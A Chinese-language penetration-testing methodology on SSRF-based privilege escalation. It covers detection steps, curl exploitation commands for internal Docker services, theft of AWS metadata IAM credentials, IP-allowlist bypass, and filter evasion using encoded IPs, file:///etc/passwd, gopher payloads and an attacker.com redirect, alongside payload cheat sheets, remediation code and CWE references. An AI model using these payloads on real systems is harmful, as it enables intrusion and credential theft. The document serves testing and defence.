# SSRF 垂直权限提升方法论文档 V1.0

**文档说明：** 本文档提供系统化的 SSRF 垂直权限提升漏洞检测与利用方法，专门针对通过 SSRF 绕过网络隔离和访问控制，实现从外部网络到内部网络的权限提升场景。

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供一套标准化、可复现的 SSRF 垂直权限提升检测与利用流程，确保能够系统性地发现和利用信任边界违规漏洞，实现从低权限网络区域到高权限网络区域的访问。

### 1.2 适用范围
本文档适用于以下场景：
- Docker 环境内部服务可通过 SSRF 访问
- 云环境元数据服务可访问
- 微服务架构中服务间无认证通信
- 网络隔离但应用层无授权检查
- SSRF 访问内部 admin 端点
- SSRF 绕过 IP 基础授权

### 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

## 第二部分：核心渗透技术专题

### 专题一：SSRF 垂直权限提升

#### 2.1 技术介绍

**漏洞原理：**
信任边界违规（Trust Boundary Violation）是指应用程序错误地信任来自特定网络区域（如内网、Docker 网络）的请求，而未进行应用层授权验证。当 SSRF 漏洞存在时，攻击者可以利用公开服务作为代理，绕过网络隔离访问内部资源，实现垂直权限提升。

**本质：** 网络层隔离被误认为是授权机制，应用层缺少服务间认证（API Key、mTLS、JWT 等）。

**危险架构模式：**

| 架构模式 | 风险描述 | 权限提升路径 |
|---------|---------|-------------|
| Docker 网络隔离 | 仅依赖 Docker 网络隔离 | 外部 → SSRF → 内部服务 |
| 云 VPC 隔离 | 仅依赖 VPC 网络 ACL | 公网 → SSRF → 元数据/内网 |
| 微服务网络分段 | 服务间无认证 | 边缘服务 → SSRF → 核心服务 |
| IP 白名单授权 | 仅检查源 IP | 外部 → SSRF(127.0.0.1) → 授权绕过 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 | 权限提升路径 |
|---------|---------|-----------|-------------|
| Docker 微服务 | web-app + internal-service | 内部服务无应用层认证 | 外部 → web-app(SSRF) → internal-service |
| 云原生应用 | EC2 + 元数据服务 | 元数据服务无认证 | 外部 → Web App(SSRF) → 169.254.169.254 |
| 管理后台隔离 | admin 端点仅监听 localhost | 仅 IP 白名单检查 | 外部 → SSRF(127.0.0.1) → admin |
| 内部 API 网关 | 服务间通信无认证 | 信任内网请求 | 外部 → 边缘服务 (SSRF) → 内部 API |
| 数据库管理界面 | phpMyAdmin 仅内网访问 | 网络隔离即授权 | 外部 → Web App(SSRF) → phpMyAdmin |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**网络架构识别：**
```bash
# 识别 Docker 环境特征
curl -I http://target.com/
# Server: Apache/2.4.54 (Debian)
# X-Powered-By: PHP/7.4.33

# 识别内部服务 hostname（信息泄露）
curl http://target.com/ | grep -i "internal\|backend\|service"
# 可能发现：http://internal-service/
```

**SSRF 端点识别：**
```bash
# 测试 URL 参数
curl "http://target.com/proxy?url=http://example.com"
curl "http://target.com/fetch?url=http://example.com"
curl "http://target.com/redirect.php?url=http://example.com"

# 观察响应是否包含目标内容
```

**内部服务探测：**
```bash
# 使用 SSRF 探测 Docker 服务名
curl "http://target.com/redirect.php?url=http://internal-service/"
curl "http://target.com/redirect.php?url=http://backend/"
curl "http://target.com/redirect.php?url=http://api/"

# 使用 SSRF 探测内网 IP
curl "http://target.com/redirect.php?url=http://10.0.0.1/"
curl "http://target.com/redirect.php?url=http://172.17.0.1/"
```

##### 2.3.2 白盒测试

**代码审计 - SSRF Sink 识别：**

PHP:
```php
// 危险模式 1：file_get_contents 无验证
$url = $_GET['url'];
$response = file_get_contents($url);  // SSRF Sink

// 危险模式 2：cURL 无验证
$ch = curl_init($_POST['url']);
curl_exec($ch);  // SSRF Sink
```

Python:
```python
# 危险模式：requests 无验证
url = request.args.get('url')
response = requests.get(url)  # SSRF Sink
```

**授权检查缺失识别：**

```php
// ❌ 内部服务无授权检查
// internal-service/index.php
<!DOCTYPE html>
<html>
<body>
    <h1>Internal Service</h1>
    FLAG: <?php echo $FLAG; ?>  <!-- 直接暴露敏感数据 -->
</body>
</html>

// 应该有的授权检查（但缺失）：
<?php
$api_key = $_SERVER['HTTP_X_INTERNAL_API_KEY'] ?? '';
if (!hash_equals(getenv('INTERNAL_SERVICE_KEY'), $api_key)) {
    http_response_code(403);
    die('Forbidden');
}
?>
```

#### 2.4 漏洞利用方法

##### 2.4.1 Docker 环境内部服务访问

**场景：**

**环境信息：**
- web-app: 10.89.10.3 (公开，端口 34287)
- internal-service: 10.89.10.2 (仅内网)

**利用步骤：**

```bash
# 步骤 1：确认 SSRF 端点
curl "http://localhost:34287/redirect.php?url=http://example.com"
# 返回 example.com 内容 → SSRF 可用

# 步骤 2：访问内部服务
curl "http://localhost:34287/redirect.php?url=http://internal-service/"
# 返回内部服务 HTML，包含 FLAG

# 步骤 3：提取敏感数据
curl -s "http://localhost:34287/redirect.php?url=http://internal-service/" | grep "FLAG:"
# FLAG: FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667}
```

**权限提升路径：**
```
外部攻击者 (无权限)
    ↓
访问公开 SSRF 端点 (redirect.php)
    ↓
代理请求到 internal-service
    ↓
获取敏感 FLAG (原本仅内部可访问)
```

##### 2.4.2 云环境元数据窃取

**AWS EC2 场景：**

```bash
# 利用 SSRF 访问元数据服务
curl "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/"

# 获取 IAM 角色凭证
curl "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 窃取临时凭证
curl "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
```

**权限提升路径：**
```
外部攻击者 (无 AWS 权限)
    ↓
利用 SSRF 访问元数据服务
    ↓
获取 IAM 临时凭证
    ↓
使用凭证访问 AWS 资源 (S3、EC2、RDS 等)
```

##### 2.4.3 IP 白名单授权绕过

**场景：Admin 端点仅允许 localhost 访问**

```php
// admin.php
<?php
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
    die('Access Denied');
}
// 管理员功能...
?>
```

**利用方法：**
```bash
# 利用 SSRF 从 localhost 发起请求
curl "http://target.com/redirect.php?url=http://127.0.0.1/admin.php"

# 或使用 localhost 域名
curl "http://target.com/redirect.php?url=http://localhost/admin.php"
```

**权限提升路径：**
```
外部攻击者 (IP 被拒绝)
    ↓
利用 SSRF 从 127.0.0.1 发起请求
    ↓
通过 IP 白名单检查
    ↓
访问管理员功能
```

##### 2.4.4 微服务间未授权访问

**场景：订单服务 → 支付服务（无认证）**

```bash
# 订单服务存在 SSRF
curl "http://order-service/api/proxy?url=http://payment-service/api/refund"

# 访问支付服务管理端点
curl "http://order-service/api/proxy?url=http://payment-service/admin/transactions"

# 提取支付凭证
curl "http://order-service/api/proxy?url=http://payment-service/api/credentials"
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过 hostname 过滤

**使用 IP 地址：**
```bash
# 如果过滤 internal-service
# 使用 DNS 解析获取 IP
dig internal-service +short
# 10.89.10.2

# 直接使用 IP
curl "http://target.com/redirect.php?url=http://10.89.10.2/"
```

**使用 IP 变体：**
```bash
# 十进制格式
curl "http://target.com/redirect.php?url=http://168430090/"  # 10.89.10.2

# 八进制格式
curl "http://target.com/redirect.php?url=http://012.0131.012.02/"

# IPv6 格式
curl "http://target.com/redirect.php?url=http://[::ffff:a59:a02]/"
```

##### 2.5.2 绕过协议过滤

**使用不同协议：**
```bash
# 如果过滤 http://
# 尝试 file:// 协议读取本地文件
curl "http://target.com/redirect.php?url=file:///etc/passwd"

# 尝试 gopher://协议进行原始 TCP 通信
curl "http://target.com/redirect.php?url=gopher://internal-service:80/_GET%20/ HTTP/1.1%0D%0AHost:%20internal-service%0D%0A%0D%0A"
```

##### 2.5.3 绕过重定向检查

**通过重定向到内网：**
```bash
# 1. 设置攻击者服务器重定向到内网
# attacker.com → 302 → http://internal-service/

# 2. 利用 SSRF 跟随重定向
curl -L "http://target.com/redirect.php?url=http://attacker.com/"
```

---

## 第三部分：渗透测试决策流程

```
                                    ┌─────────────────┐
                                    │  SSRF 权限提升测试  │
                                    └────────┬────────┘
                                             │
                                             ▼
                                    ┌─────────────────┐
                                    │   架构分析       │
                                    │  - 网络拓扑识别  │
                                    │  - 服务发现      │
                                    │  - 信任边界映射  │
                                    └────────┬────────┘
                                             │
                    ┌────────────────────────┼────────────────────────┐
                    │                        │                        │
                    ▼                        ▼                        ▼
          ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
          │  Docker 环境     │      │   云环境        │      │   IP 白名单     │
          └────────┬────────┘      └────────┬────────┘      └────────┬────────┘
                   │                        │                        │
                   ▼                        ▼                        ▼
          ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
          │  ref/ssrf-      │      │  ref/ssrf-      │      │  ref/ssrf-      │
          │  vertical-      │      │  cloud-metadata │      │  ip-bypass.md   │
          │  privilege-     │      │                 │      │                 │
          │  escalation.md  │      │                 │      │                 │
          └─────────────────┘      └─────────────────┘      └─────────────────┘
```

---

## 第四部分：检测清单

### 4.1 架构特征检测

| 特征 | 检测方法 | 风险表现 |
|------|---------|---------|
| Docker 网络隔离 | `docker network ls` | 仅网络层隔离 |
| 内部服务无认证 | 代码审计 | 无 API Key 检查 |
| SSRF 端点存在 | 输入点测试 | URL 参数无验证 |
| 敏感数据在内网 | 信息收集 | FLAG/凭证在内网服务 |
| IP 白名单授权 | 代码审计 | 仅检查 REMOTE_ADDR |

### 4.2 SSRF 端点检测

| 检测项 | 检测方法 | SSRF 特征 |
|-------|---------|----------|
| URL 参数 | `?url=http://` | 参数值像 URL |
| 响应反射 | 比较请求/响应 | 目标内容被返回 |
| 时间差异 | 请求慢响应 URL | 响应时间变化 |
| 协议支持 | `file://`、`gopher://` | 多协议支持 |

---

## 第五部分：常用 Payload 速查表

### 5.1 Docker 环境内部服务访问

| 目标 | Payload | 说明 |
|------|---------|------|
| Docker 服务名 | `http://internal-service/` | Docker DNS 解析 |
| 容器 IP | `http://10.89.10.2/` | 直接 IP 访问 |
| 特定端口 | `http://internal-service:8080/` | 端口访问 |
| Docker 网关 | `http://172.17.0.1/` | 宿主机网络 |

### 5.2 云环境元数据

| 云服务商 | Payload | 说明 |
|---------|---------|------|
| AWS | `http://169.254.169.254/latest/meta-data/` | EC2 元数据 |
| AWS IAM | `http://169.254.169.254/latest/meta-data/iam/` | IAM 凭证 |
| GCP | `http://metadata.google.internal/computeMetadata/` | GCP 元数据 |
| Azure | `http://169.254.169.254/metadata/instance` | Azure 元数据 |

### 5.3 IP 白名单绕过

| 目标 | Payload | 说明 |
|------|---------|------|
| Localhost | `http://127.0.0.1/` | 标准回环地址 |
| Localhost 变体 | `http://0:0:0:0:0:0:0:1/` | IPv6 回环 |
| Localhost 十进制 | `http://2130706433/` | 十进制 127.0.0.1 |

### 5.4 敏感数据特征

| 数据类型 | 特征模式 | 提取命令 |
|---------|---------|---------|
| CTF Flag | `FLAG{[a-f0-9]+}` | `grep -o "FLAG{.*}"` |
| AWS Key | `AKIA[0-9A-Z]{16}` | `grep -oE "AKIA.*"` |
| JWT Token | `eyJ[a-zA-Z0-9_-]+` | `grep -oE "eyJ.*"` |
| 密码/密钥 | `password\|secret\|key` | `grep -i "password"` |

---

## 第六部分：修复建议

### 6.1 架构层修复

1. **实施服务间认证**
   - API Key 验证
   - mTLS 双向认证
   - JWT/Bearer Token 验证

2. **网络层加固**
   - 最小权限网络策略
   - 服务网格 (Istio/Linkerd)
   - 零信任网络架构

### 6.2 代码层修复

**PHP 示例 - 服务间认证：**
```php
<?php
// internal-service/index.php
$api_key = $_SERVER['HTTP_X_INTERNAL_API_KEY'] ?? '';
$expected_key = getenv('INTERNAL_SERVICE_KEY');

if (!hash_equals($expected_key, $api_key)) {
    http_response_code(403);
    header('Content-Type: application/json');
    die(json_encode(['error' => 'Forbidden']));
}
?>
```

**SSRF 防护 - URL 验证：**
```php
<?php
function validateUrl($url) {
    $parsed = parse_url($url);
    
    // 仅允许 http/https
    if (!in_array($parsed['scheme'], ['http', 'https'])) {
        return false;
    }
    
    // 阻止私有 IP
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    
    return true;
}
?>
```

---

## 参考资源

- [OWASP Top 10:2025 A01 Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Testing](https://portswigger.net/web-security/ssrf)
- [AWS SSRF Vulnerability Guide](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)

## 附录 A：CWE-918 相关信息

### A.1 CWE-918 定义

**CWE-918: Server-Side Request Forgery (SSRF)** 是指 Web 服务器从上游组件接收 URL 或类似请求并获取该 URL 的内容，但没有充分确保请求被发送到预期的目的地。

### A.2 常见攻击向量

| 攻击向量 | 说明 | 利用示例 |
|---------|------|---------|
| 内网探测 | 使用服务器代理扫描内部网络 | `http://192.168.1.1`, `http://10.0.0.1` |
| 访问本地资源 | 使用 `file://` 协议访问系统文件 | `file:///etc/passwd` |
| 云元数据窃取 | 访问云服务商元数据端点 | `http://169.254.169.254/latest/meta-data/` |
| 协议滥用 | 使用 `gopher://`, `dict://` 等协议 | `gopher://localhost:6379/_INFO` |
| 绕过防火墙 | 利用服务器身份访问受限资源 | 访问内网管理界面 |

### A.3 CAPEC 攻击模式

| CAPEC-ID | 攻击模式 |
|---------|---------|
| CAPEC-664 | Server Side Request Forgery |

### A.4 已知 CVE 案例

| CVE 编号 | 描述 |
|---------|------|
| CVE-2024-3095 | LLM 应用框架中的 SSRF，URL 检索器允许连接本地地址 |
| CVE-2021-26855 | 邮件服务器 SSRF（CISA KEV 在野利用） |
| CVE-2021-21973 | 云平台 SSRF（CISA KEV 在野利用） |
| CVE-2016-4029 | 利用十进制 IP 格式验证绕过 SSRF 防护 |
| CVE-2009-0037 | URL 下载库自动重定向到 `file://` 和 `scp://` |

### A.5 与 CWE-611 (XXE) 的关系

- 两者都涉及发出出站请求到意外目的地
- XXE 可在客户端执行，SSRF 特指服务器端
- 可组合利用（XXE 隧道进行 SSRF 攻击）

---

**文档版本：** V1.0
**最后更新：** 2026-03-15
**适用技能：** broken-access-control (SSRF 垂直权限提升)
**关联 CWE：** CWE-918, CWE-284, CWE-639
